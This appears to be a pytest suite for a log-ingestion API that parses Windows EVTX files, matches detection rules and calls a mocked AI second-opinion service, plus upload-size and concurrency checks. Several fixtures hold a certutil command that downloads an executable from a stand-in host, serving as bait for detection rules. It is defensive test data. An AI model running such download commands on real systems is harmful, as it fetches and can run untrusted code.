"""Day 6 verification (Pair 1): POST /ingest accepts EVTX uploads, runs
the read -> normalize -> persist pipeline, and handles malformed/empty/
wrong-format files. `api_client` fixture (conftest.py) provides the
TestClient + in-memory SQLite session.
"""

from pathlib import Path

from app.models.event import Event

SYSMON_DEMO_PATH = Path(__file__).resolve().parents[2] / "sample_logs" / "sysmon_demo.evtx"


def _system(
    event_id,
    computer="WORKSTATION01",
    system_time="2026-05-24T15:25:16.809914+00:00",
    channel="Microsoft-Windows-Sysmon/Operational",
):
    return {
        "EventID": event_id,
        "TimeCreated": {"@SystemTime": system_time},
        "Computer": computer,
        "Channel": channel,
    }


def _record(event_id, computer="WORKSTATION01", channel="Microsoft-Windows-Sysmon/Operational"):
    return {"Event": {"System": _system(event_id, computer=computer, channel=channel), "EventData": {"Data": []}}}


def test_ingest_sysmon_demo_happy_path(api_client):
    client, SessionLocal = api_client
    with open(SYSMON_DEMO_PATH, "rb") as f:
        response = client.post(
            "/ingest",
            files={"file": ("sysmon_demo.evtx", f, "application/octet-stream")},
        )
    assert response.status_code == 200
    assert response.json() == {
        "filename": "sysmon_demo.evtx",
        "records_read": 4,
        "events_ingested": 4,
        "events_skipped": 0,
        "duplicate_events_skipped": 0,
        "rule_matches": 0,
        "matched_rule_titles": [],
        "alerts_created": 0,
        "incident_ids": [],
        "covered_events": 4,
        "routine_events": 0,
        "uncovered_events": 0,
        "advisory_hits": 0,
        "notices": [],
        "uncovered_breakdown": [],
        "ai_opinion_id": None,
        "channels": ["Microsoft-Windows-Sysmon/Operational"],
        "providers": ["Microsoft-Windows-Sysmon"],
        "ml_anomalies": 0,
        "ml_anomaly_titles": [],
        "ml_mode": "advisory",
        "event_id_breakdown": [
            {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1, "count": 3, "covered": True, "kind": "checked"},
            {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 11, "count": 1, "covered": True, "kind": "checked"},
        ],
    }
    with SessionLocal() as db:
        assert db.query(Event).count() == 4


def test_ingest_rejects_wrong_extension(api_client):
    client, SessionLocal = api_client
    response = client.post(
        "/ingest",
        files={"file": ("notlogs.txt", b"just some text", "text/plain")},
    )
    assert response.status_code == 400
    assert "unsupported file type" in response.json()["detail"]
    with SessionLocal() as db:
        assert db.query(Event).count() == 0


def test_ingest_rejects_empty_file(api_client):
    client, _ = api_client
    response = client.post(
        "/ingest",
        files={"file": ("empty.evtx", b"", "application/octet-stream")},
    )
    assert response.status_code == 400
    assert response.json()["detail"] == "uploaded file is empty"


def test_ingest_rejects_oversized_file(api_client, monkeypatch):
    # Monkeypatch the limit down rather than actually sending 100MB+ --
    # same effect, instant instead of slow.
    monkeypatch.setattr("app.api.routes_ingest.MAX_UPLOAD_BYTES", 10)
    client, _ = api_client
    response = client.post(
        "/ingest",
        files={"file": ("big.evtx", b"x" * 100, "application/octet-stream")},
    )
    assert response.status_code == 413
    assert "too large" in response.json()["detail"]


def test_ingest_accepts_a_file_exactly_at_the_size_limit(api_client, monkeypatch):
    """Boundary check for the chunked-copy size enforcement (routes_ingest.py
    streams the upload to its on-disk temp file in bounded chunks, checking
    the running total against MAX_UPLOAD_BYTES as it goes, rather than
    reading the whole body into memory first) -- exactly-at-the-limit must
    still succeed, confirming the check is a strict `>`, not `>=`."""
    monkeypatch.setattr("app.api.routes_ingest.MAX_UPLOAD_BYTES", 10)
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_record("1")]),
    )
    client, _ = api_client
    response = client.post(
        "/ingest",
        files={"file": ("exact.evtx", b"x" * 10, "application/octet-stream")},
    )
    assert response.status_code == 200


def test_ingest_rejects_a_file_one_byte_over_the_limit(api_client, monkeypatch):
    monkeypatch.setattr("app.api.routes_ingest.MAX_UPLOAD_BYTES", 10)
    client, _ = api_client
    response = client.post(
        "/ingest",
        files={"file": ("over.evtx", b"x" * 11, "application/octet-stream")},
    )
    assert response.status_code == 413
    assert "too large" in response.json()["detail"]


def test_ingest_rejects_corrupted_evtx_bytes(api_client):
    client, _ = api_client
    # Under ~40 bytes, python-evtx fails to even read the file header and
    # raises EvtxReadError; larger garbage blobs used to be read as a
    # zero-chunk/zero-record "success" instead of raising, since python-evtx
    # never validates the magic bytes on its own (see evtx_reader.py, which
    # now checks FileHeader.check_magic() explicitly to close that gap).
    garbage = b"not a real evtx file, too short"
    response = client.post(
        "/ingest",
        files={"file": ("corrupt.evtx", garbage, "application/octet-stream")},
    )
    assert response.status_code == 400
    assert response.json()["detail"].startswith("failed to parse EVTX file")

    # Realistic-size garbage (e.g. a renamed .txt file, like fake.evtx in the
    # Postman collection) is long enough that python-evtx's chunk-bounds
    # arithmetic alone never raises -- this is the case that previously
    # slipped through as a false 200.
    larger_garbage = b"This is intentionally corrupted EVTX test data. " * 3
    response = client.post(
        "/ingest",
        files={"file": ("fake.evtx", larger_garbage, "application/octet-stream")},
    )
    assert response.status_code == 400
    assert response.json()["detail"].startswith("failed to parse EVTX file")


def test_ingest_skips_malformed_records_and_ingests_the_rest(api_client, monkeypatch):
    client, SessionLocal = api_client
    good_1 = _record("1")
    good_2 = _record("11")
    bad = _record("1")
    del bad["Event"]["System"]["EventID"]  # triggers EventNormalizationError

    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([good_1, bad, good_2]),
    )

    response = client.post(
        "/ingest",
        files={"file": ("fake.evtx", b"content is irrelevant, reader is mocked", "application/octet-stream")},
    )
    assert response.status_code == 200
    assert response.json() == {
        "filename": "fake.evtx",
        "records_read": 3,
        "events_ingested": 2,
        "events_skipped": 1,
        "duplicate_events_skipped": 0,
        "rule_matches": 0,
        "matched_rule_titles": [],
        "alerts_created": 0,
        "incident_ids": [],
        "covered_events": 2,
        "routine_events": 0,
        "uncovered_events": 0,
        "advisory_hits": 0,
        "notices": [],
        "uncovered_breakdown": [],
        "ai_opinion_id": None,
        "channels": ["Microsoft-Windows-Sysmon/Operational"],
        "providers": [],
        "ml_anomalies": 0,
        "ml_anomaly_titles": [],
        "ml_mode": "advisory",
        "event_id_breakdown": [
            {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1, "count": 1, "covered": True, "kind": "checked"},
            {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 11, "count": 1, "covered": True, "kind": "checked"},
        ],
    }
    with SessionLocal() as db:
        assert db.query(Event).count() == 2


def test_ingest_survives_a_record_that_fails_xml_parsing(api_client, monkeypatch):
    """The real-world regression: a record that reads fine as raw EVTX
    bytes but isn't well-formed XML once decoded (confirmed live against a
    real Windows export -- a stray control character in a field value is
    enough to make xmltodict.parse raise ExpatError) used to propagate
    uncaught past this route's `except EvtxReadError` (a different
    exception class), turning one bad record in an otherwise-valid file
    into a whole-upload 500. Exercises the REAL evtx_reader.py against the
    real sysmon_demo.evtx fixture (only `record_to_dict` is faked to fail
    once), not a fully mocked reader, so this proves the actual production
    code path, not just the unit-level behavior in test_evtx_reader.py."""
    import app.ingestion.evtx_reader as evtx_reader_module

    real_record_to_dict = evtx_reader_module.record_to_dict
    call_count = {"n": 0}

    def flaky_record_to_dict(xml_str: str) -> dict:
        call_count["n"] += 1
        if call_count["n"] == 1:
            raise ValueError("not well-formed (invalid token): line 40, column 87")
        return real_record_to_dict(xml_str)

    monkeypatch.setattr(evtx_reader_module, "record_to_dict", flaky_record_to_dict)

    client, SessionLocal = api_client
    with open(SYSMON_DEMO_PATH, "rb") as f:
        response = client.post(
            "/ingest",
            files={"file": ("sysmon_demo.evtx", f, "application/octet-stream")},
        )

    assert response.status_code == 200  # not 500
    body = response.json()
    assert body["records_read"] == 4  # unchanged -- the bad record still counts as read
    assert body["events_ingested"] == 3  # one fewer than the full-file happy path (4)
    assert body["events_skipped"] == 1
    with SessionLocal() as db:
        assert db.query(Event).count() == 3


# -- AI second opinion trigger (uncovered events, zero rule matches) -------


def test_ingest_triggers_ai_opinion_for_fully_uncovered_zero_match_file(api_client, monkeypatch):
    """event_id 9999 isn't in any category's event-id set on any channel --
    guaranteed uncovered regardless of which rules are loaded."""
    client, SessionLocal = api_client
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_record("9999", channel="Security")]),
    )
    # fill_in_opinion (run as a BackgroundTask) opens its own fresh
    # SessionLocal() -- outside FastAPI's get_db dependency-override
    # mechanism the api_client fixture uses, so it must be pointed at the
    # same in-memory test engine explicitly.
    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
    monkeypatch.setattr(
        "app.services.ai_opinion_service.generate",
        lambda messages: "Nothing stands out here.\n\n## Assessment: Nothing unusual noted",
    )

    response = client.post(
        "/ingest",
        files={"file": ("mystery.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] == 0
    assert body["uncovered_events"] == 1
    assert body["ai_opinion_id"] is not None

    opinion_response = client.get(f"/ai-opinions/{body['ai_opinion_id']}")
    assert opinion_response.status_code == 200
    opinion = opinion_response.json()
    # TestClient runs BackgroundTasks inline before returning control, so by
    # the time the POST above returns, the (mocked) LLM call has already
    # resolved -- this asserts the *shape* of that terminal state, not
    # timing (see ai_opinion_service tests for the fire-and-forget contract
    # in isolation).
    assert opinion["status"] == "ready"
    assert opinion["assessment_label"] == "nothing_unusual"
    with SessionLocal() as db:
        assert db.query(Event).count() == 1


def test_ingest_does_not_trigger_ai_opinion_when_a_rule_matches(api_client, monkeypatch):
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter(
            [
                {
                    "Event": {
                        "System": _system("1", channel="Microsoft-Windows-Sysmon/Operational"),
                        "EventData": {
                            "Data": [
                                {"@Name": "Image", "#text": "C:\\Windows\\System32\\certutil.exe"},
                                {"@Name": "CommandLine", "#text": "certutil.exe -urlcache -split -f http://x/a.exe"},
                            ]
                        },
                    }
                }
            ]
        ),
    )
    called = {"opinion": False}
    monkeypatch.setattr(
        "app.api.routes_ingest.create_pending_opinion",
        lambda *a, **k: called.__setitem__("opinion", True) or None,
    )

    client, _SessionLocal = api_client
    response = client.post(
        "/ingest",
        files={"file": ("real_hit.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    assert response.json()["rule_matches"] >= 1
    assert response.json()["ai_opinion_id"] is None
    assert called["opinion"] is False


def test_ingest_triggers_ai_opinion_when_a_rule_matches_and_other_events_are_uncovered(api_client, monkeypatch):
    """The critical partial-coverage regression: a real rule match
    elsewhere in the file must NOT suppress the opinion for events the
    matched rule says nothing about. Before this fix, a single match
    anywhere in the file (even a false positive) silenced analysis of
    every other uncovered event -- proven live against a real capture
    during this feature's audit (2 matches, 1,531 uncovered events, no
    opinion)."""
    client, SessionLocal = api_client
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter(
            [
                {
                    "Event": {
                        "System": _system("1", channel="Microsoft-Windows-Sysmon/Operational"),
                        "EventData": {
                            "Data": [
                                {"@Name": "Image", "#text": "C:\\Windows\\System32\\certutil.exe"},
                                {"@Name": "CommandLine", "#text": "certutil.exe -urlcache -split -f http://x/a.exe"},
                            ]
                        },
                    }
                },
                _record("9999", channel="Security"),  # guaranteed uncovered on any loaded ruleset
            ]
        ),
    )
    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
    captured = {}

    def capture_generate(messages):
        captured["messages"] = messages
        return "Nothing else stands out in the uncovered sample.\n\n## Assessment: Nothing unusual noted"

    monkeypatch.setattr("app.services.ai_opinion_service.generate", capture_generate)

    response = client.post(
        "/ingest",
        files={"file": ("mixed_partial.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] >= 1
    assert body["uncovered_events"] == 1
    assert body["ai_opinion_id"] is not None  # the opinion still fires

    opinion = client.get(f"/ai-opinions/{body['ai_opinion_id']}").json()
    assert opinion["status"] == "ready"

    # Guardrail 1 scoping: the prompt must tell the model what was already
    # detected, so it stays scoped to the remaining uncovered slice rather
    # than re-litigating the whole file.
    rendered = "\n".join(m.content for m in captured["messages"])
    assert body["matched_rule_titles"][0] in rendered


def test_ingest_ai_opinion_sample_stays_bounded_and_round_robins_across_uncovered_event_types(
    api_client, monkeypatch
):
    """Before the round-robin fix, many consecutive events of one uncovered
    type could exhaust the whole sample budget before a second type was
    ever seen. Here, event type 9001 appears 30 times before event type
    9002 appears once -- first-N-chronological would never sample 9002 at
    all; round-robin must."""
    client, SessionLocal = api_client
    records = [_record("9001", channel="Security") for _ in range(30)] + [_record("9002", channel="Security")]
    monkeypatch.setattr("app.api.routes_ingest.read_records_as_dicts", lambda path: iter(records))
    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
    captured = {}

    def capture_generate(messages):
        captured["messages"] = messages
        return "Nothing stands out.\n\n## Assessment: Nothing unusual noted"

    monkeypatch.setattr("app.services.ai_opinion_service.generate", capture_generate)

    response = client.post(
        "/ingest",
        files={"file": ("skewed.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["uncovered_events"] == 31

    rendered = "\n".join(m.content for m in captured["messages"])
    assert "event_id: 9001" in rendered
    assert "event_id: 9002" in rendered  # would be crowded out by first-N-chronological


def test_ingest_does_not_trigger_ai_opinion_when_fully_covered_and_clean(api_client, monkeypatch):
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_record("1"), _record("11")]),  # both covered Sysmon categories, no rule matches
    )

    client, _SessionLocal = api_client
    response = client.post(
        "/ingest",
        files={"file": ("clean.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] == 0
    assert body["uncovered_events"] == 0
    assert body["ai_opinion_id"] is None


# -- AI second opinion trigger (advisory-pattern flag, e.g. named-pipe ------
# discovery) -- independent of the uncovered/zero-match trigger above -----


def _pipe_record(pipe_name, image="System", channel="Microsoft-Windows-Sysmon/Operational"):
    return {
        "Event": {
            "System": _system("18", channel=channel),
            "EventData": {
                "Data": [
                    {"@Name": "Image", "#text": image},
                    {"@Name": "PipeName", "#text": pipe_name},
                ]
            },
        }
    }


def test_ingest_triggers_ai_opinion_for_named_pipe_discovery_even_when_event_id_is_covered(api_client, monkeypatch):
    """event_id 18 (pipe_event) is a covered category via the real
    rogue_spoolss_named_pipe.yml rule, so this file is NOT the
    uncovered-events path -- the advisory flag must fire on its own."""
    client, SessionLocal = api_client
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_pipe_record("\\lsass")]),
    )
    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
    monkeypatch.setattr(
        "app.services.ai_opinion_service.generate",
        lambda messages: "Worth a look.\n\n## Assessment: Worth reviewing",
    )

    response = client.post(
        "/ingest",
        files={"file": ("pipe_discovery.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] == 0
    assert body["uncovered_events"] == 0  # genuinely covered, not the uncovered-events path
    assert body["ai_opinion_id"] is not None

    opinion = client.get(f"/ai-opinions/{body['ai_opinion_id']}").json()
    assert opinion["status"] == "ready"
    assert opinion["assessment_label"] == "worth_reviewing"


def test_ingest_triggers_ai_opinion_for_named_pipe_discovery_alongside_a_real_rule_match(api_client, monkeypatch):
    """The pipe connect and an unrelated real detection can both be true in
    the same file -- the advisory flag must fire even though rule_matches
    is nonzero, unlike the uncovered-events trigger."""
    client, SessionLocal = api_client
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter(
            [
                {
                    "Event": {
                        "System": _system("1", channel="Microsoft-Windows-Sysmon/Operational"),
                        "EventData": {
                            "Data": [
                                {"@Name": "Image", "#text": "C:\\Windows\\System32\\certutil.exe"},
                                {"@Name": "CommandLine", "#text": "certutil.exe -urlcache -split -f http://x/a.exe"},
                            ]
                        },
                    }
                },
                _pipe_record("\\srvsvc"),
            ]
        ),
    )
    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
    monkeypatch.setattr(
        "app.services.ai_opinion_service.generate",
        lambda messages: "Worth a look.\n\n## Assessment: Worth reviewing",
    )

    response = client.post(
        "/ingest",
        files={"file": ("mixed.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] >= 1
    assert body["ai_opinion_id"] is not None


def test_ingest_does_not_trigger_ai_opinion_for_unrelated_pipe_activity(api_client, monkeypatch):
    client, _SessionLocal = api_client
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_pipe_record("\\wkssvc")]),
    )

    response = client.post(
        "/ingest",
        files={"file": ("benign_pipe.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    assert response.json()["ai_opinion_id"] is None


# -- covered-but-unmatched service installations (defect fix, 2026-09-11) ---


def _service_install_record(service_type, event_id="4697"):
    return {
        "Event": {
            "System": _system(event_id, channel="Security"),
            "EventData": {
                "Data": [
                    {"@Name": "ServiceName", "#text": "svc"},
                    {"@Name": "ServiceFileName", "#text": "C:\\Windows\\System32\\svc.exe"},
                    {"@Name": "ServiceType", "#text": service_type},
                ]
            },
        }
    }


def test_ingest_triggers_ai_opinion_for_covered_but_unmatched_service_install(api_client, monkeypatch):
    """Regression for the MSF-payload-via-service finding: ServiceType
    0x00000010 IS a covered category via the real
    kernel_driver_service_installed.yml rule, but that rule only matches
    ServiceType 0x00000001 -- previously this read as "100% covered,
    clean" with no AI opinion at all. Uses the real loaded rule (not
    monkeypatched), same posture as the named-pipe tests above."""
    client, SessionLocal = api_client
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_service_install_record("0x00000010")]),
    )
    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
    monkeypatch.setattr(
        "app.services.ai_opinion_service.generate",
        lambda messages: "Worth a look.\n\n## Assessment: Worth reviewing",
    )

    response = client.post(
        "/ingest",
        files={"file": ("msf_service.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] == 0
    assert body["covered_events"] == 1
    assert body["uncovered_events"] == 0  # genuinely covered, not the uncovered-events path
    assert body["ai_opinion_id"] is not None

    opinion = client.get(f"/ai-opinions/{body['ai_opinion_id']}").json()
    assert opinion["status"] == "ready"
    assert opinion["assessment_label"] == "worth_reviewing"


def test_ingest_does_not_trigger_extra_ai_opinion_for_kernel_driver_service_install(api_client, monkeypatch):
    """ServiceType 0x00000001 (kernel driver) matches the real rule and
    creates a real alert -- the new advisory pattern must not also fire on
    the same event, since it's the complement of the rule's scope, not an
    overlapping second opinion. An opinion may still legitimately fire for
    other reasons (there are none here), so this asserts no crash and a
    real alert, not the absence of ai_opinion_id."""
    client, _SessionLocal = api_client
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_service_install_record("0x00000001")]),
    )

    response = client.post(
        "/ingest",
        files={"file": ("mimikatz_driver.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] == 1
    assert body["alerts_created"] == 1
    assert body["ai_opinion_id"] is None


# -- Phase 2B: Upload Size Hardening Tests ---------------------------------

def test_ingest_rejects_oversized_request_by_content_length(api_client, monkeypatch):
    """Early pre-receive rejection if Content-Length is honestly declared."""
    client, _ = api_client
    monkeypatch.setattr("app.api.routes_ingest.MAX_UPLOAD_BYTES", 10)
    
    # We construct a request with a large Content-Length header but we don't
    # actually need to send that much data because the dependency checks the header first.
    response = client.post(
        "/ingest",
        # Send a tiny file so TestClient would normally set a tiny Content-Length,
        # but we override it in headers.
        files={"file": ("small.evtx", b"x", "application/octet-stream")},
        headers={"Content-Length": str(10 + 1024 * 1024 + 1)}, # MAX_UPLOAD_BYTES + 1MB + 1
    )
    assert response.status_code == 413
    assert "content-length exceeds the limit" in response.json()["detail"]


def test_ingest_enforces_limit_even_with_misleading_small_content_length(api_client, monkeypatch):
    """If an attacker forges a small Content-Length to bypass the early rejection,
    the application-level check post-spooling must still catch it."""
    client, _ = api_client
    monkeypatch.setattr("app.api.routes_ingest.MAX_UPLOAD_BYTES", 10)
    
    response = client.post(
        "/ingest",
        # Send a file much larger than 10 bytes
        files={"file": ("oversized.evtx", b"x" * 100, "application/octet-stream")},
        headers={"Content-Length": "5"}, # Misleading!
    )
    assert response.status_code == 413
    assert "too large" in response.json()["detail"]
    assert "content-length" not in response.json()["detail"] # Caught by the chunked check, not early rejection


def test_ingest_requires_content_length(api_client):
    """A chunked upload (no Content-Length) is refused by the upload guard
    before any of the body is read -- chunked transfer used to bypass the
    early size check entirely and force the whole body to be spooled."""
    client, _ = api_client

    def chunked_payload():
        yield b"--boundary\r\n"
        yield b'Content-Disposition: form-data; name="file"; filename="test.evtx"\r\n'
        yield b"Content-Type: application/octet-stream\r\n\r\n"
        yield b"x" * 100
        yield b"\r\n--boundary--\r\n"

    response = client.post(
        "/ingest",
        content=chunked_payload(),
        headers={"Content-Type": "multipart/form-data; boundary=boundary"},
    )
    assert response.status_code == 411


def test_ingest_rejects_declared_oversize_before_reading_body(api_client, monkeypatch):
    client, _ = api_client
    monkeypatch.setattr("app.core.upload_guard.settings.max_upload_bytes", 10)
    response = client.post(
        "/ingest",
        content=b"x" * (2 * 1024 * 1024),
        headers={"Content-Type": "multipart/form-data; boundary=boundary"},
    )
    assert response.status_code == 413
    assert "too large" in response.json()["detail"]


def test_ingest_rejects_multipart_with_multiple_files_exceeding_limit(api_client, monkeypatch):
    """Multiple parts in a multipart request must still be caught if their
    combined size exceeds the limit, even when the primary file is small."""
    client, _ = api_client
    monkeypatch.setattr("app.api.routes_ingest.MAX_UPLOAD_BYTES", 10)

    body = (
        b"--boundary\r\n"
        b'Content-Disposition: form-data; name="file"; filename="test.evtx"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n" + b"x" * 5 + b"\r\n--boundary\r\n"
        b'Content-Disposition: form-data; name="other"; filename="other.evtx"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n" + b"x" * 20 + b"\r\n--boundary--\r\n"
    )
    response = client.post(
        "/ingest",
        content=body,
        headers={"Content-Type": "multipart/form-data; boundary=boundary"},
    )
    assert response.status_code == 413
    assert "total size of all parts exceeds the limit" in response.json()["detail"]


def test_ingest_accepts_a_valid_upload_comfortably_under_the_limit(api_client, monkeypatch):
    """check_upload_size_limit's early Content-Length check and its
    request.form()-based part-size summation must both let a genuine,
    well-under-the-limit multipart upload through untouched -- asserted
    against real EVTX bytes and real ingestion output (not a mocked
    reader), the same rigor as test_ingest_sysmon_demo_happy_path, so a
    regression that made the size check falsely reject (or corrupt the
    file en route) would be caught here even if that test's own implicit
    coverage were ever weakened."""
    monkeypatch.setattr("app.api.routes_ingest.MAX_UPLOAD_BYTES", 200_000)
    client, SessionLocal = api_client
    with open(SYSMON_DEMO_PATH, "rb") as f:
        response = client.post(
            "/ingest",
            files={"file": ("sysmon_demo.evtx", f, "application/octet-stream")},
        )
    assert response.status_code == 200
    body = response.json()
    assert body["records_read"] == 4
    assert body["events_ingested"] == 4
    assert body["events_skipped"] == 0
    with SessionLocal() as db:
        assert db.query(Event).count() == 4


# --- One upload at a time (19 Oct 2026 audit, F-05) -------------------------


def _upload_demo(client, path="/ingest"):
    with open(SYSMON_DEMO_PATH, "rb") as f:
        return client.post(path, files={"file": ("sysmon_demo.evtx", f, "application/octet-stream")})


def test_a_second_upload_while_one_is_running_is_refused(api_client):
    from app.api import routes_ingest

    client, SessionLocal = api_client
    assert routes_ingest._ingest_slots.acquire(blocking=False)  # an upload in progress
    try:
        for path in ("/ingest", "/ingest/async"):
            response = _upload_demo(client, path)
            assert response.status_code == 409
            assert response.json()["detail"] == routes_ingest.BUSY_DETAIL
    finally:
        routes_ingest._ingest_slots.release()
    with SessionLocal() as db:
        assert db.query(Event).count() == 0


def test_the_upload_slot_is_freed_after_a_rejected_file(api_client):
    client, _ = api_client
    rejected = client.post("/ingest", files={"file": ("notlogs.txt", b"text", "text/plain")})
    assert rejected.status_code == 400

    assert _upload_demo(client).status_code == 200


def test_the_upload_slot_is_freed_after_an_async_job_finishes(api_client):
    client, _ = api_client
    # TestClient runs the background job before returning the response.
    assert _upload_demo(client, "/ingest/async").status_code == 202

    assert _upload_demo(client, "/ingest/async").status_code == 202

